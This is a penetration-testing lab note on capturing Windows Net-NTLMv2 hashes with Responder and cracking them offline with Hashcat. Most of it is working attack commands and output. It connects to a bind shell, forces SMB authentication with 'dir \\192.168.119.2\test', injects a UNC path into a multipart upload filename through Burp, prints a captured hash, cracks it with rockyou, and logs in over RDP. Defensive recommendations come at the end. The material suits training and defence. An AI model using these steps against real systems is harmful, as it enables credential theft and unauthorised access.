# Cracking Net-NTLMv2

## Overview

**Net-NTLMv2** is a Windows network authentication protocol used during NTLM-based authentication over the network.

It is different from a raw **NTLM hash** stored in the SAM database.

A raw NTLM hash is often extracted from places such as:

- SAM database
- LSASS memory
- NTDS.dit

A Net-NTLMv2 hash is usually captured during a network authentication attempt.

The goal is to force a target Windows system or user context to authenticate to a machine we control, capture the Net-NTLMv2 challenge-response, and then attempt to crack it offline.

---

## NTLM vs Net-NTLMv2

| Type | Where It Comes From | Can Be Passed Directly? | Can Be Cracked? | Hashcat Mode |
|---|---|---:|---:|---:|
| NTLM / NTHash | SAM, LSASS, NTDS.dit | Yes | Yes | `1000` |
| Net-NTLMv1 | Network authentication | Usually no | Yes | `5500` |
| Net-NTLMv2 | Network authentication | Usually no | Yes | `5600` |

> [!important]
> Do not confuse **NTLM** with **Net-NTLMv2**.
>
> NTLM is the stored password hash.
>
> Net-NTLMv2 is a network authentication challenge-response format.

---

## Why Net-NTLMv2 Capture Works

When a Windows system authenticates to an SMB server, the process uses a challenge-response exchange.

At a high level:

1. The client tries to access a network resource.
2. The server sends a challenge.
3. The client calculates a response using the user's NTLM hash.
4. The server checks whether the response is valid.
5. Access is granted or denied.

If we control the server, we can capture the authentication attempt.

This does not directly reveal the plaintext password or raw NTLM hash, but it gives us a Net-NTLMv2 hash that can be cracked offline.

---

## When This Is Useful

Capturing Net-NTLMv2 is useful when we have limited access to a Windows machine but cannot dump credentials directly.

For example, we may have:

- a low-privileged shell
- code execution as a normal user
- access to a web application running on Windows
- a file upload feature that interacts with SMB paths
- a way to make the target request a UNC path

This is especially useful when we cannot run tools such as Mimikatz because we do not have local administrator privileges.

---

## Lab Scenario

Target machine:

```text
FILES01
192.168.50.211
```

Attacker machine:

```text
Kali
192.168.119.2
```

Responder interface:

```text
tap0
```

Target user context:

```text
FILES01\paul
```

Goal:

```text
Capture and crack paul's Net-NTLMv2 hash
```

---

# Initial Access

In this example, we have a bind shell running on the target.

Connect to the bind shell from Kali:

```bash
nc 192.168.50.211 4444
```

Example output:

```text
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Check the current user:

```cmd
whoami
```

Example output:

```text
files01\paul
```

Check the user's local group membership:

```cmd
net user paul
```

Example output:

```text
Local Group Memberships      *Remote Desktop Users *Users
Global Group memberships     *None
```

This shows that `paul` is not a local administrator.

Because of this, we cannot easily dump credentials from SAM or LSASS using tools such as Mimikatz.

---

# Starting Responder

## Identify the Kali Interface

On Kali, check the available interfaces:

```bash
ip a
```

Example interface:

```text
tap0
```

Example IP:

```text
192.168.119.2
```

---

## Start Responder

Start Responder on the correct interface:

```bash
sudo responder -I tap0
```

Responder should show that the SMB server is enabled:

```text
SMB server                 [ON]
```

Expected status:

```text
[+] Listening for events...
```

---

## What Responder Is Doing

Responder can run several rogue services and poisoning modules.

For this note, the important feature is its built-in SMB server.

Responder will:

1. listen for inbound SMB authentication attempts
2. negotiate NTLM authentication
3. capture the Net-NTLMv2 challenge-response
4. print the captured hash

---

# Forcing Authentication from a Shell

If we have command execution on the target, we can force the target to authenticate to our Responder SMB server by requesting a UNC path.

From the Windows shell:

```cmd
dir \\192.168.119.2\test
```

The share name does not need to exist.

```text
\\192.168.119.2\test
```

The important part is that the Windows host attempts to authenticate to the SMB server.

Expected target-side result:

```text
Access is denied.
```

This is fine. We only need the authentication attempt.

---

## Captured Responder Output

Responder should capture something like:

```text
[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801...
```

The captured hash format starts like this:

```text
paul::FILES01:<server_challenge>:<ntlmv2_response>:<blob>
```

---

# Forcing Authentication via a Web Application

## Scenario

During a web application test, a file upload feature may process filenames or file paths server-side.

If the web application is running on Windows, it may attempt to resolve or access a supplied UNC path.

This can be abused to force the web server to authenticate to a Responder SMB instance.

---

## Burp Suite Upload Filename Technique

In the activity, the file upload request was intercepted in **Burp Suite** and the upload filename was modified to point to the Responder SMB server.

The goal was to make the Windows web application interact with:

```text
\\<attacker-ip>\<share>
```

Example Responder UNC path:

```text
\\192.168.119.2\share\nonexistent.txt
```

---

## Example Multipart Upload Request

Original upload request:

```http
POST /upload HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryExample

------WebKitFormBoundaryExample
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

test
------WebKitFormBoundaryExample--
```

Modified upload request:

```http
POST /upload HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryExample

------WebKitFormBoundaryExample
Content-Disposition: form-data; name="file"; filename="\\192.168.119.2\share\nonexistent.txt"
Content-Type: text/plain

test
------WebKitFormBoundaryExample--
```

If the server processes the filename as a path or attempts to access the UNC location, it may authenticate to the Responder SMB server.

---

## Burp Workflow

1. Start Responder:

```bash
sudo responder -I tap0
```

2. Upload a normal file through the web application.

3. Intercept the upload request in Burp Suite.

4. Locate the multipart `filename` parameter:

```http
filename="test.txt"
```

5. Replace it with a UNC path pointing to Responder:

```http
filename="\\192.168.119.2\share\nonexistent.txt"
```

6. Forward the request.

7. Check Responder for captured Net-NTLMv2 credentials.

---

## Important Notes

The share or file does not need to exist.

The value is only used to trigger an SMB authentication attempt.

Useful examples:

```text
\\192.168.119.2\share
\\192.168.119.2\share\nonexistent.txt
\\192.168.119.2\test
```

If successful, Responder captures the Net-NTLMv2 hash of the account used by the web application or Windows process.

This could be:

- the logged-in user
- the application pool identity
- a service account
- the machine account
- another context depending on how the application handles files

---

## Why This Works

Windows treats UNC paths as network locations.

A UNC path uses this format:

```text
\\server\share\path
```

When Windows tries to access the UNC path, it may attempt SMB authentication automatically.

If the `server` points to the attacker's Responder instance, the authentication attempt can be captured.

---

# Saving the Captured Hash

Copy the full Net-NTLMv2 hash from Responder into a file.

Example:

```bash
nano paul.hash
```

The file should contain one full hash line:

```text
paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E004800550058004300340054004900430004003400570049004E002D00340044004E00480055005800430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000
```

Check the file:

```bash
cat paul.hash
```

---

# Identifying the Hashcat Mode

Search for NTLM-related Hashcat modes:

```bash
hashcat -hh | grep -i "ntlm"
```

Relevant output:

```text
5500  | NetNTLMv1 / NetNTLMv1+ESS
27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)
5600  | NetNTLMv2
27100 | NetNTLMv2 (NT)
1000  | NTLM
```

The correct mode for Net-NTLMv2 is:

```text
5600
```

---

# Cracking Net-NTLMv2 with Hashcat

Use Hashcat mode `5600`:

```bash
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

Example cracked output:

```text
PAUL::FILES01:1f9d4c51f6e74653:795f138ec69c274d0fd53bb32908a72b:010100000000000000b050cd1777d801...:123Password123
```

The cracked password is:

```text
123Password123
```

---

## Showing Cracked Results

To display cracked results later:

```bash
hashcat -m 5600 paul.hash --show
```

---

# Confirming the Password

If the cracked password is valid and the user has RDP rights, confirm with RDP.

Example user:

```text
FILES01\paul
```

Example password:

```text
123Password123
```

Example RDP command:

```bash
xfreerdp /v:192.168.50.211 /u:paul /p:'123Password123'
```

If the user is a member of `Remote Desktop Users`, RDP may be permitted.

---

# Common Capture Triggers

## From Command Execution

```cmd
dir \\<attacker-ip>\share
```

Example:

```cmd
dir \\192.168.119.2\test
```

---

## From PowerShell

```powershell
ls \\<attacker-ip>\share
```

Example:

```powershell
ls \\192.168.119.2\test
```

---

## From Web Upload Filename

```text
\\<attacker-ip>\share\nonexistent.txt
```

Example:

```text
\\192.168.119.2\share\nonexistent.txt
```

---

## From File Inclusion / File Path Inputs

Any Windows application feature that accepts a file path may be worth testing.

Examples:

```text
\\192.168.119.2\share\file.txt
\\192.168.119.2\test
```

Potential input locations:

- upload filename fields
- import/export paths
- document conversion paths
- avatar upload handlers
- report generation paths
- file preview features
- backup/restore paths
- printer paths
- template paths

---

# Troubleshooting

## Responder Does Not Capture Anything

Check:

- Responder is running as root
- correct interface was selected with `-I`
- Kali IP is reachable from the target
- firewall rules allow inbound SMB
- target can route to the attacker machine
- SMB server is enabled in Responder
- target actually attempted to access the UNC path

Useful check:

```bash
ip a
```

Then restart Responder with the correct interface:

```bash
sudo responder -I <interface>
```

---

## Web App Does Not Trigger Authentication

Possible reasons:

- application sanitises filenames
- application strips path separators
- upload handler ignores supplied filename
- server runs on Linux rather than Windows
- outbound SMB is blocked
- web server does not access the filename as a path
- application stores only the basename
- EDR or network controls block the attempt

Try variations:

```text
\\192.168.119.2\share
\\192.168.119.2\share\nonexistent.txt
//192.168.119.2/share/nonexistent.txt
```

---

## Hashcat Does Not Crack the Hash

Possible causes:

- password is not in the wordlist
- hash was copied incorrectly
- hash line is incomplete
- wrong Hashcat mode
- captured account uses a strong password
- formatting was changed when saving the hash

Verify mode:

```bash
hashcat -hh | grep -i "NetNTLMv2"
```

Expected mode:

```text
5600
```

---

# Key Differences from Pass-the-Hash

Net-NTLMv2 hashes are not normally used directly for Pass-the-Hash.

They are usually:

- captured from network authentication
- cracked offline
- relayed in some scenarios
- used to recover plaintext credentials if weak

A raw NTLM hash can often be used directly with PtH tools.

A Net-NTLMv2 hash usually needs to be cracked or relayed.

---

# Practical Workflow

1. Gain low-privileged access or find an input that causes server-side file access.
2. Start Responder on Kali.
3. Force the target to access a UNC path.
4. Capture the Net-NTLMv2 hash.
5. Save the full hash to a file.
6. Crack with Hashcat mode `5600`.
7. Validate the recovered password.
8. Use the password for further access if permitted.

---

# Quick Command Reference

## Start Responder

```bash
sudo responder -I <interface>
```

Example:

```bash
sudo responder -I tap0
```

---

## Trigger SMB Auth from Windows CMD

```cmd
dir \\<attacker-ip>\share
```

Example:

```cmd
dir \\192.168.119.2\test
```

---

## Trigger SMB Auth from PowerShell

```powershell
ls \\<attacker-ip>\share
```

Example:

```powershell
ls \\192.168.119.2\test
```

---

## Burp Filename Payload

```text
\\<attacker-ip>\share\nonexistent.txt
```

Example:

```text
\\192.168.119.2\share\nonexistent.txt
```

---

## Check Hashcat Mode

```bash
hashcat -hh | grep -i "ntlm"
```

---

## Crack Net-NTLMv2

```bash
hashcat -m 5600 <hashfile> /usr/share/wordlists/rockyou.txt
```

Example:

```bash
hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
```

---

## Show Cracked Password

```bash
hashcat -m 5600 paul.hash --show
```

---

# Defensive Recommendations

To reduce the risk of Net-NTLMv2 capture and cracking:

- disable or restrict NTLM where possible
- enforce Kerberos where possible
- block outbound SMB from servers and workstations
- disable LLMNR, NBT-NS, and unnecessary multicast name resolution
- require SMB signing where appropriate
- monitor for Responder-style poisoning
- restrict service account privileges
- use strong passwords for service accounts and users
- prevent applications from accessing arbitrary UNC paths
- sanitise file upload filenames
- store uploaded files using server-generated filenames
- strip path traversal and UNC path characters
- prevent web applications from making outbound SMB connections

---

## Web Application Defensive Notes

For upload features:

- do not trust client-supplied filenames
- replace filenames with random server-generated names
- store metadata separately from filesystem paths
- strip backslashes and forward slashes
- reject UNC paths
- validate file extensions and MIME types
- prevent the application from resolving remote file paths
- block outbound SMB at the network layer

---

# Key Takeaways

- Net-NTLMv2 is captured during network authentication.
- It is different from a raw NTLM hash.
- Responder can capture Net-NTLMv2 hashes using its SMB server.
- A low-privileged shell can force authentication with `dir \\attacker-ip\share`.
- A vulnerable web upload feature may be abused by changing the upload filename to a UNC path.
- Hashcat mode `5600` is used to crack Net-NTLMv2.
- Net-NTLMv2 hashes are usually cracked or relayed, not passed directly like raw NTLM hashes.
- Blocking outbound SMB is a strong mitigation.
- Web apps should never trust client-controlled filenames as filesystem paths.

---

# Related Notes

- [[Password Attacks — Cracking NTLM Hashes]]
- [[Password Attacks — Passing NTLM]]
- [[Password Attacks — Pass the Hash]]
- [[Password Attacks — SAM, SYSTEM, and SECURITY]]
- [[Password Attacks — Attacking LSASS]]
- [[Enumeration — SMB]]
- [[Lateral Movement]]
- [[Web Applications — File Upload Testing]]

---

# Tags

#password-attacks #net-ntlmv2 #ntlmv2 #responder #hashcat #smb #burp-suite #file-upload #unc-path #windows #oscp